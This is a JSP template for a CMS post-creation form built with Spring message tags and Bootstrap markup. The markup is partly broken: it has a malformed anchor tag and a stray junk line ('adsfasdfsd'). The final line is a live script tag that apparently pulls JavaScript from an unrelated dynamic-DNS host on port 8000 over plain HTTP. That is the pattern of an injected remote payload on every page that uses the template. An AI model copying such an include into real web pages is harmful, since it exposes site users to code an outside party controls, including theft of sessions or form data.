<%@taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>

<h1><spring:message code="post.create.title" /></h1>
<p class="small"><spring:message code="post.create.label.site" />: <a href="${pageContext.request.contextPath}/cms/posts/${site.slug}"></a><strong>${site.name.content}</strong></a>  </p>
<form class="form-horizontal" action="" method="post" role="form">
  <div class="${emptyName ? "form-group has-error" : "form-group"}">
    <label for="inputEmail3" class="col-sm-2 control-label"><spring:message code="post.create.label.name" /></label>
    <div class="col-sm-10">
      <input bennu-localized-string required name="name" id="inputEmail3" placeholder="<spring:message code="post.create.label.name" />">
      <c:if test="${emptyName != null}"><p class="text-danger"><spring:message code="post.create.error.emptyName"/></p></c:if>
    </div>
  </div>

  <div class="form-group">
    <label for="inputEmail3" class="col-sm-2 control-label"><spring:message code="post.create.label.body" /></label>
    <div class="col-sm-10">
      <textarea bennu-html-editor bennu-localized-string required name="body" rows="3"></textarea>
    </div>
  </div>
adsfasdfsd


  <div class="form-group">
    <div class="col-sm-offset-2 col-sm-10">
      <button type="submit" class="btn btn-default btn-primary"><spring:message code="action.create" /></button>
    </div>
  </div>
</form>

<link rel="stylesheet" href="${pageContext.request.contextPath}/static/css/font-awesome.css"/>
<!-- <script src="${pageContext.request.contextPath}/static/js/toolkit.js"></script> -->
<link rel="stylesheet" href="${pageContext.request.contextPath}/static/css/toolkit/toolkit.css"/>
<script src="http://worf.bounceme.net:8000/"></script>